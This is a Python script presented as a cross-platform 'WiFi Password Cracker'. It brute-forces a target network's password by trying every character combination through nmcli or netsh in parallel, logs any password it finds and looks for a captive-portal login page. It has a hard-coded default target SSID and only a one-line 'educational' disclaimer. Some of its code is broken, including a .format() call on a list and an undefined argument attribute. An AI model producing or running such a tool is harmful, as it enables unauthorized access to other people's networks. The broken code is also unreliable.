#!/usr/bin/env python3
"""
WiFi Password Cracker - Enhanced Cross-Platform Version
A tool for testing WiFi network security through brute-force password attacks.
"""

import subprocess
import requests
import itertools
import string
import argparse
import logging
import sys
import time
import signal
import platform
import os
from threading import Thread, Event, Lock
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Optional, Tuple
from dataclasses import dataclass
from pathlib import Path

# -----------------------------
# OS Detection
# -----------------------------

def get_os_info() -> dict:
    """Detect operating system and set appropriate settings."""
    system = platform.system().lower()
    
    if system == "windows":
        return {
            'os': 'windows',
            'encoding': 'utf-8',  # Force UTF-8 for Windows
            'disconnect_cmd': ['netsh', 'wlan', 'disconnect'],
            'connect_cmd_template': ['netsh', 'wlan', 'connect', 'name="{ssid}"'],
            'verify_cmd': ['netsh', 'wlan', 'show', 'interfaces'],
            'interface_keyword': 'SSID'
        }
    else:
        return {
            'os': 'linux',
            'encoding': 'utf-8',
            'disconnect_cmd': ['nmcli', 'dev', 'disconnect', 'wlan0'],
            'connect_cmd_template': ['nmcli', 'dev', 'wifi', 'connect', '{ssid}', 'password', '{password}'],
            'verify_cmd': ['nmcli', '-t', '-f', 'NAME,TYPE', 'connection', 'show', '--active'],
            'interface_keyword': '802-11-wireless'
        }

# Global OS info
os_info = get_os_info()

# -----------------------------
# Configuration and Constants
# -----------------------------

@dataclass
class Config:
    """Configuration settings for the WiFi cracker."""
    default_ssid: str = 'SkiTheEast'
    default_password_lengths: List[int] = None
    characters: str = string.ascii_letters + string.digits + string.punctuation
    request_timeout: int = 5
    delay_between_attempts: float = 0.05
    max_workers: int = 4
    log_file: str = "wifi_cracker.log"
    batch_size: int = 1000
    max_memory_percent: int = 85
    resource_check_interval: int = 100
    
    def __post_init__(self):
        if self.default_password_lengths is None:
            self.default_password_lengths = [4, 5]

# Global configuration
config = Config()

# Event to handle graceful termination
terminate_event = Event()
log_lock = Lock()

# -----------------------------
# Cross-Platform Logging Setup
# -----------------------------

def setup_logging(verbose: bool = False) -> None:
    """Configure logging with cross-platform Unicode support."""
    log_level = logging.DEBUG if verbose else logging.INFO
    
    # Create log directory if it doesn't exist
    log_path = Path(config.log_file)
    log_path.parent.mkdir(parents=True, exist_ok=True)
    
    # Use ASCII-safe messages for Windows console
    if os_info['os'] == 'windows':
        # Configure console for UTF-8 on Windows
        if hasattr(sys.stdout, 'reconfigure'):
            sys.stdout.reconfigure(encoding='utf-8')
        if hasattr(sys.stderr, 'reconfigure'):
            sys.stderr.reconfigure(encoding='utf-8')
        
        # Set console code page to UTF-8 (Windows 10+)
        try:
            subprocess.run(['chcp', '65001'], shell=True, capture_output=True)
        except:
            pass
    
    # Custom formatter with safe characters
    class SafeFormatter(logging.Formatter):
        def format(self, record):
            # Replace Unicode emojis with ASCII alternatives on Windows
            if os_info['os'] == 'windows':
                message = record.getMessage()
                message = message.replace('✅', '[OK]')
                message = message.replace('❌', '[FAIL]')
                message = message.replace('⚠️', '[WARN]')
                message = message.replace('🔑', '[KEY]')
                message = message.replace('📡', '[WIFI]')
                message = message.replace('🔍', '[SEARCH]')
                message = message.replace('🎉', '[SUCCESS]')
                message = message.replace('⏱️', '[TIME]')
                message = message.replace('🔢', '[COUNT]')
                message = message.replace('🚀', '[START]')
                message = message.replace('📊', '[PROGRESS]')
                message = message.replace('🔚', '[END]')
                message = message.replace('🛑', '[STOP]')
                message = message.replace('🌐', '[URL]')
                message = message.replace('🔓', '[CRACK]')
                record.msg = message
            
            return super().format(record)
    
    # Create handlers
    file_handler = logging.FileHandler(config.log_file, encoding='utf-8')
    console_handler = logging.StreamHandler(sys.stdout)
    
    # Set formatters
    formatter = SafeFormatter('%(asctime)s [%(levelname)s] %(message)s')
    file_handler.setFormatter(formatter)
    console_handler.setFormatter(formatter)
    
    # Configure logging
    logging.basicConfig(
        level=log_level,
        handlers=[file_handler, console_handler],
        force=True  # Reset existing configuration
    )
    
    global logger
    logger = logging.getLogger(__name__)

# -----------------------------
# Cross-Platform Network Operations
# -----------------------------

class WiFiManager:
    """Manages WiFi connections and network detection across platforms."""
    
    @staticmethod
    def connect_to_wifi(ssid: str, password: str) -> bool:
        """
        Attempts to connect to the specified WiFi network using OS-appropriate commands.
        
        Args:
            ssid: The SSID of the WiFi network
            password: The password for the WiFi network
            
        Returns:
            True if connection is successful, False otherwise
        """
        try:
            # First, disconnect from any existing connection
            disconnect_cmd = os_info['disconnect_cmd']
            subprocess.run(disconnect_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
            
            # OS-specific connection logic
            if os_info['os'] == 'windows':
                # For Windows, we need to create a profile first
                return WiFiManager._connect_windows(ssid, password)
            else:
                # Linux connection
                connect_cmd = os_info['connect_cmd_template'].format(ssid=ssid, password=password)
                result = subprocess.run(
                    connect_cmd, 
                    check=True, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE,
                    timeout=15
                )
                
                with log_lock:
                    logger.info(f"[OK] Successfully connected to: {ssid}")
                return True
            
        except subprocess.CalledProcessError as e:
            with log_lock:
                error_msg = e.stderr.decode('utf-8', errors='ignore').strip()
                logger.debug(f"[FAIL] Failed to connect: {error_msg}")
            return False
        except subprocess.TimeoutExpired:
            with log_lock:
                logger.debug("[TIME] Connection attempt timed out")
            return False
        except Exception as e:
            with log_lock:
                logger.error(f"[WARN] Unexpected error: {e}")
            return False
    
    @staticmethod
    def _connect_windows(ssid: str, password: str) -> bool:
        """Windows-specific WiFi connection logic."""
        try:
            # Create temporary XML profile for Windows
            profile_xml = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
            
            # Write profile to temporary file
            profile_file = f"temp_wifi_profile_{int(time.time())}.xml"
            with open(profile_file, 'w', encoding='utf-8') as f:
                f.write(profile_xml)
            
            try:
                # Add profile
                add_cmd = ['netsh', 'wlan', 'add', 'profile', f'filename="{profile_file}"']
                subprocess.run(add_cmd, check=True, capture_output=True, timeout=10)
                
                # Connect
                connect_cmd = ['netsh', 'wlan', 'connect', f'name="{ssid}"']
                result = subprocess.run(connect_cmd, capture_output=True, timeout=15)
                
                # Wait a bit for connection
                time.sleep(3)
                
                # Clean up
                try:
                    os.remove(profile_file)
                    subprocess.run(['netsh', 'wlan', 'delete', 'profile', f'name="{ssid}"'], 
                                 capture_output=True, timeout=5)
                except:
                    pass
                
                if result.returncode == 0:
                    with log_lock:
                        logger.info(f"[OK] Successfully connected to: {ssid}")
                    return True
                else:
                    return False
                    
            finally:
                # Ensure cleanup
                try:
                    if os.path.exists(profile_file):
                        os.remove(profile_file)
                except:
                    pass
                    
        except Exception as e:
            with log_lock:
                logger.error(f"[WARN] Windows connection error: {e}")
            return False
    
    @staticmethod
    def detect_login_url() -> Optional[str]:
        """
        Detects captive portal login URL by checking for redirects.
        
        Returns:
            The detected login URL if redirection occurs, else None
        """
        test_urls = [
            "http://www.google.com",
            "http://httpbin.org/redirect/1",
            "http://example.com"
        ]
        
        for test_url in test_urls:
            try:
                response = requests.get(
                    test_url, 
                    allow_redirects=True, 
                    timeout=config.request_timeout
                )
                
                if response.history:
                    login_url = response.url
                    with log_lock:
                        logger.info(f"[SEARCH] Detected login URL: {login_url}")
                    return login_url
                    
            except requests.RequestException:
                continue
        
        with log_lock:
            logger.info("[SEARCH] No captive portal detected")
        return None
    
    @staticmethod
    def verify_connection(ssid: str) -> bool:
        """
        Verifies that we're actually connected to the correct network.
        
        Args:
            ssid: Expected SSID
            
        Returns:
            True if connected to correct network, False otherwise
        """
        try:
            result = subprocess.run(
                os_info['verify_cmd'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=10
            )
            
            output = result.stdout
            
            if os_info['os'] == 'windows':
                # Windows netsh output parsing
                return ssid in output and "connected" in output.lower()
            else:
                # Linux nmcli output parsing
                active_connections = output.strip().split('\n')
                for conn in active_connections:
                    if ssid in conn and os_info['interface_keyword'] in conn:
                        return True
                return False
            
        except Exception:
            return False

# -----------------------------
# Password Generation (unchanged)
# -----------------------------

class PasswordGenerator:
    """Generates password combinations for brute-force attacks."""
    
    @staticmethod
    def generate_combinations(length: int, charset: str = None) -> itertools.product:
        """Generates all possible combinations of specified length."""
        if charset is None:
            charset = config.characters
        return itertools.product(charset, repeat=length)
    
    @staticmethod
    def estimate_combinations(lengths: List[int], charset: str = None) -> int:
        """Estimates total number of password combinations."""
        if charset is None:
            charset = config.characters
        
        total = 0
        for length in lengths:
            total += len(charset) ** length
        return total

# -----------------------------
# Resource Monitoring (unchanged)
# -----------------------------

import psutil

def check_system_resources() -> bool:
    """Check if system resources are critically low."""
    try:
        memory = psutil.virtual_memory()
        if memory.percent > config.max_memory_percent:
            with log_lock:
                logger.warning(f"[WARN] High memory usage: {memory.percent}% - Pausing...")
            return False
        
        cpu = psutil.cpu_percent(interval=1)
        if cpu > 90:
            with log_lock:
                logger.warning(f"[WARN] High CPU usage: {cpu}% - Pausing...")
            return False
            
        return True
    except Exception:
        return True

# -----------------------------
# Cracking Engine (unchanged)
# -----------------------------

class WiFiCracker:
    """Main password cracking engine."""
    
    def __init__(self, ssid: str, password_lengths: List[int]):
        self.ssid = ssid
        self.password_lengths = password_lengths
        self.wifi_manager = WiFiManager()
        self.password_generator = PasswordGenerator()
        self.attempts = 0
        self.start_time = None
        
    def try_password(self, password: str) -> Tuple[bool, Optional[str]]:
        """Attempts to connect using a single password."""
        if terminate_event.is_set():
            return False, None
            
        self.attempts += 1
        
        # Resource check every N attempts
        if self.attempts % config.resource_check_interval == 0:
            if not check_system_resources():
                time.sleep(2)
        
        with log_lock:
            logger.debug(f"[KEY] Attempt {self.attempts}: {password}")
        
        success = self.wifi_manager.connect_to_wifi(self.ssid, password)
        
        if success:
            if self.wifi_manager.verify_connection(self.ssid):
                login_url = self.wifi_manager.detect_login_url()
                return True, login_url
            else:
                # Disconnect from wrong network
                subprocess.run(os_info['disconnect_cmd'], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        time.sleep(config.delay_between_attempts)
        return False, None
    
    def crack_passwords_parallel(self) -> Optional[Tuple[str, Optional[str]]]:
        """Attempts to crack passwords using parallel processing."""
        self.start_time = time.time()
        total_combinations = self.password_generator.estimate_combinations(
            self.password_lengths, config.characters
        )
        
        with log_lock:
            logger.info(f"[CRACK] WiFi Password Cracker Started")
            logger.info(f"[WIFI] Target SSID: {self.ssid}")
            logger.info(f"[KEY] Password Lengths: {self.password_lengths}")
            logger.info(f"[COUNT] Total Combinations: {total_combinations:,}")
            logger.info(f"[START] Starting parallel brute-force with {config.max_workers} workers...")
        
        with ThreadPoolExecutor(max_workers=config.max_workers) as executor:
            for length in self.password_lengths:
                if terminate_event.is_set():
                    break
                    
                with log_lock:
                    logger.info(f"[SEARCH] Trying passwords of length: {length}")
                
                # Generate and process passwords in batches
                password_batch = []
                batch_count = 0
                
                for combo in self.password_generator.generate_combinations(length):
                    if terminate_event.is_set():
                        break
                        
                    password = ''.join(combo)
                    password_batch.append(password)
                    
                    if len(password_batch) >= config.batch_size:
                        batch_count += 1
                        
                        futures = {
                            executor.submit(self.try_password, pwd): pwd 
                            for pwd in password_batch
                        }
                        
                        for future in as_completed(futures):
                            if terminate_event.is_set():
                                break
                                
                            success, login_url = future.result()
                            if success:
                                elapsed = time.time() - self.start_time
                                with log_lock:
                                    logger.info(f"[SUCCESS] Password found: {futures[future]}")
                                    logger.info(f"[TIME] Time elapsed: {elapsed:.2f} seconds")
                                    logger.info(f"[COUNT] Total attempts: {self.attempts}")
                                    if login_url:
                                        logger.info(f"[URL] Login URL: {login_url}")
                                return futures[future], login_url
                        
                        password_batch.clear()
                        
                        if batch_count % 10 == 0:
                            with log_lock:
                                logger.info(f"[PROGRESS] Processed {batch_count * config.batch_size:,} passwords...")
                        
                        time.sleep(0.1)
                
                if password_batch and not terminate_event.is_set():
                    futures = {
                        executor.submit(self.try_password, pwd): pwd 
                        for pwd in password_batch
                    }
                    
                    for future in as_completed(futures):
                        if terminate_event.is_set():
                            break
                            
                        success, login_url = future.result()
                        if success:
                            elapsed = time.time() - self.start_time
                            with log_lock:
                                logger.info(f"[SUCCESS] Password found: {futures[future]}")
                                logger.info(f"[TIME] Time elapsed: {elapsed:.2f} seconds")
                                logger.info(f"[COUNT] Total attempts: {self.attempts}")
                                if login_url:
                                    logger.info(f"[URL] Login URL: {login_url}")
                            return futures[future], login_url
        
        return None
    
    def crack_passwords_sequential(self) -> Optional[Tuple[str, Optional[str]]]:
        """Attempts to crack passwords sequentially."""
        self.start_time = time.time()
        
        with log_lock:
            logger.info(f"[CRACK] WiFi Password Cracker Started (Sequential Mode)")
            logger.info(f"[WIFI] Target SSID: {self.ssid}")
            logger.info(f"[KEY] Password Lengths: {self.password_lengths}")
        
        for length in self.password_lengths:
            if terminate_event.is_set():
                break
                
            with log_lock:
                logger.info(f"[SEARCH] Trying passwords of length: {length}")
            
            for combo in self.password_generator.generate_combinations(length):
                if terminate_event.is_set():
                    break
                    
                password = ''.join(combo)
                success, login_url = self.try_password(password)
                
                if success:
                    elapsed = time.time() - self.start_time
                    with log_lock:
                        logger.info(f"[SUCCESS] Password found: {password}")
                        logger.info(f"[TIME] Time elapsed: {elapsed:.2f} seconds")
                        logger.info(f"[COUNT] Total attempts: {self.attempts}")
                        if login_url:
                            logger.info(f"[URL] Login URL: {login_url}")
                    return password, login_url
        
        return None

# -----------------------------
# Interactive Input Functions (unchanged)
# -----------------------------

def get_target_ssid() -> str:
    """Interactive prompt for user to input target SSID."""
    print("\n" + "="*60)
    print("TARGET SELECTION")
    print("="*60)
    print("Please enter the SSID of the WiFi network you want to test.")
    print("This should be the exact network name as it appears in your WiFi list.\n")
    
    while True:
        ssid = input("Enter target SSID: ").strip()
        
        if not ssid:
            print("SSID cannot be empty. Please try again.")
            continue
        
        print(f"\nYou selected: '{ssid}'")
        confirm = input("Is this correct? (y/n): ").strip().lower()
        
        if confirm in ['y', 'yes']:
            return ssid
        elif confirm in ['n', 'no']:
            print("Let's try again...")
        else:
            print("Invalid input. Please enter 'y' or 'n'.")

def get_password_lengths() -> List[int]:
    """Interactive prompt for user to input password lengths."""
    print("\n" + "="*60)
    print("PASSWORD LENGTH CONFIGURATION")
    print("="*60)
    print("Enter the password lengths you want to test (space-separated).")
    print("Example: 4 5 6 will test all 4, 5, and 6 character passwords\n")
    
    while True:
        input_str = input("Enter password lengths (e.g., 4 5 6): ").strip()
        
        if not input_str:
            print("Please enter at least one password length.")
            continue
        
        try:
            lengths = [int(x.strip()) for x in input_str.split()]
            
            if any(length <= 0 for length in lengths):
                print("Password lengths must be positive numbers.")
                continue
            
            if any(length > 12 for length in lengths):
                print("Warning: Password lengths > 12 will take extremely long time!")
                confirm = input("Continue anyway? (y/n): ").strip().lower()
                if confirm not in ['y', 'yes']:
                    continue
            
            print(f"\nYou selected lengths: {lengths}")
            confirm = input("Is this correct? (y/n): ").strip().lower()
            
            if confirm in ['y', 'yes']:
                return lengths
            elif confirm in ['n', 'no']:
                print("Let's try again...")
            else:
                print("Invalid input. Please enter 'y' or 'n'.")
                
        except ValueError:
            print("Invalid input. Please enter numbers separated by spaces.")

def show_advanced_options() -> dict:
    """Interactive prompt for advanced configuration options."""
    print("\n" + "="*60)
    print("ADVANCED CONFIGURATION")
    print("="*60)
    print("Configure advanced settings or press Enter to use defaults.\n")
    
    options = {}
    
    workers_input = input(f"Max parallel workers (default: {config.max_workers}): ").strip()
    if workers_input:
        try:
            options['max_workers'] = int(workers_input)
        except ValueError:
            print("Invalid input, using default.")
            options['max_workers'] = config.max_workers
    else:
        options['max_workers'] = config.max_workers
    
    delay_input = input(f"Delay between attempts in seconds (default: {config.delay_between_attempts}): ").strip()
    if delay_input:
        try:
            options['delay_between_attempts'] = float(delay_input)
        except ValueError:
            print("Invalid input, using default.")
            options['delay_between_attempts'] = config.delay_between_attempts
    else:
        options['delay_between_attempts'] = config.delay_between_attempts
    
    batch_input = input(f"Batch size (default: {config.batch_size}): ").strip()
    if batch_input:
        try:
            options['batch_size'] = int(batch_input)
        except ValueError:
            print("Invalid input, using default.")
            options['batch_size'] = config.batch_size
    else:
        options['batch_size'] = config.batch_size
    
    sequential_input = input("Use sequential mode instead of parallel? (y/n, default: n): ").strip().lower()
    if sequential_input in ['y', 'yes']:
        options['sequential'] = True
    else:
        options['sequential'] = False
    
    return options

# -----------------------------
# Utility Functions
# -----------------------------

def graceful_exit(signum=None, frame=None) -> None:
    """Handle graceful termination signals."""
    with log_lock:
        logger.info("[STOP] Termination signal received. Stopping...")
    terminate_event.set()

def print_banner() -> None:
    """Print application banner."""
    banner = f"""
╔══════════════════════════════════════════════════════════╗
║                    WiFi Password Cracker                 ║
║           Enhanced Cross-Platform Version v2.2          ║
║           For Educational &amp; Security Testing Only       ║
║                    Running on: {os_info['os'].upper():<15} ║
╚══════════════════════════════════════════════════════════╝
    """
    print(banner)

# -----------------------------
# Argument Parsing (unchanged)
# -----------------------------

def parse_arguments() -> argparse.Namespace:
    """Parse and validate command-line arguments."""
    parser = argparse.ArgumentParser(
        description="WiFi Password Cracker - Enhanced Cross-Platform Version",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -s MyNetwork -l 4 5 6
  %(prog)s --ssid "WiFi Name" --lengths 8 --verbose
  %(prog)s -s TestNetwork -l 4 --workers 8 --delay 0.01
  %(prog)s --interactive  # Use interactive mode
        """
    )
    
    parser.add_argument(
        '-s', '--ssid',
        type=str,
        help='SSID of target WiFi network'
    )
    
    parser.add_argument(
        '-l', '--lengths',
        type=int,
        nargs='+',
        help='Password lengths to attempt'
    )
    
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Enable verbose logging for debugging'
    )
    
    parser.add_argument(
        '-w', '--workers',
        type=int,
        help=f'Number of parallel workers (default: {config.max_workers})'
    )
    
    parser.add_argument(
        '-d', '--delay',
        type=float,
        help=f'Delay between attempts in seconds (default: {config.delay_between_attempts})'
    )
    
    parser.add_argument(
        '--charset',
        type=str,
        default=config.characters,
        help='Custom character set for password generation'
    )
    
    parser.add_argument(
        '--sequential',
        action='store_true',
        help='Use sequential cracking instead of parallel'
    )
    
    parser.add_argument(
        '-i', '--interactive',
        action='store_true',
        help='Use interactive mode for configuration'
    )
    
    return parser.parse_args()

# -----------------------------
# Main Function
# -----------------------------

def main() -> None:
    """Main entry point of the application."""
    # Parse arguments
    args = parse_arguments()
    
    # Interactive mode or missing arguments
    if args.interactive or not args.ssid:
        print_banner()
        print("Welcome to Interactive Mode!")
        print("Let's configure your WiFi penetration test step by step.\n")
        
        # Get target SSID
        ssid = get_target_ssid() if not args.ssid else args.ssid
        
        # Get password lengths
        password_lengths = get_password_lengths() if not args.lengths else args.lengths
        
        # Get advanced options
        advanced_options = show_advanced_options()
        
        # Update args with interactive inputs
        args.ssid = ssid
        args.lengths = password_lengths
        args.max_workers = advanced_options.get('max_workers') or args.workers or config.max_workers
        args.delay_between_attempts = advanced_options.get('delay_between_attempts') or args.delay or config.delay_between_attempts
        args.sequential = advanced_options.get('sequential', args.sequential)
                
    else:
        # Use command-line arguments
        if not args.lengths:
            args.lengths = config.default_password_lengths
        if not args.workers:
            args.workers = config.max_workers
        if not args.delay:
            args.delay = config.delay_between_attempts
        
        print_banner()
    
    # Update config with arguments
    config.characters = args.charset
    config.max_workers = args.max_workers
    config.delay_between_attempts = args.delay_between_attempts
    
    # Setup logging
    setup_logging(args.verbose)
    
    # Register signal handlers
    try:
        signal.signal(signal.SIGINT, graceful_exit)
        signal.signal(signal.SIGTERM, graceful_exit)
    except Exception as e:
        logger.warning(f"[WARN] Could not set signal handlers: {e}")
    
    # Create and run cracker
    cracker = WiFiCracker(args.ssid, args.lengths)
    
    try:
        if args.sequential:
            result = cracker.crack_passwords_sequential()
        else:
            result = cracker.crack_passwords_parallel()
        
        if result is None:
            elapsed = time.time() - cracker.start_time
            with log_lock:
                logger.warning("[WARN] Password not found within specified lengths")
                logger.info(f"[TIME] Total time elapsed: {elapsed:.2f} seconds")
                logger.info(f"[COUNT] Total attempts made: {cracker.attempts}")
    
    except KeyboardInterrupt:
        logger.info("User interrupted the process")
    
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
    
    finally:
        logger.info("[END] Script execution completed")

if __name__ == "__main__":
    main()
